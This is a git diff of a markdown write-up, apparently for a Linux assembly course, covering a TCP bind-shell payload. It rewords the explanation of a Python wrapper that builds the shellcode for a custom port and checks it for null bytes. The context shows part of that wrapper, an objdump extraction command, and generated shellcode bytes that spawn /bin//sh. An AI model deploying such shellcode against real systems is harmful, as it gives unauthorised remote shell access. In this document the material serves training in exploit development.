@@ -809,7 +809,9 @@ osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./shell_bind_tcp|grep '[0-9a-f]:'|g
 
 Once the raw shellcode has been extracted, the last requirement to complete the assignment is to ensure the port number is easily configurable. 
 
-This can be achieved by utilising a Python wrapper which takes a standard 2 byte port number, and dynamically generates shellcode based on the user input (reference below includes the original hardcoded shellcode for port 4444):
+This can be achieved by utilising a Python wrapper which takes a standard 2 byte port number, and checks the supplied port number to ensure the custom port is valid.
+
+The reference below includes the original hardcoded shellcode for port 4444):
 
 ```python
 #!/usr/bin/python
@@ -850,8 +852,9 @@ print "Shellcode length: %d bytes" % len(shellcode)
 if "\x00" in shellcode:
     print "WARNING: Null byte is present!"
 else:
-    print "No nulls detected."
+    print "No nulls detected"
 ```
+The Python code then dynamically generates shellcode in hex format based on the user input, calculating the shellcode length and checking for Null bytes in the process: 
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ python shell_bind_tcp_wrapper.py 4444
@@ -865,7 +868,7 @@ Generated shellcode using custom port: 4444
 \x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
 
 Shellcode length: 455 bytes
-No nulls detected.
+No nulls detected
 ```
 
 compile and execute c code ... 
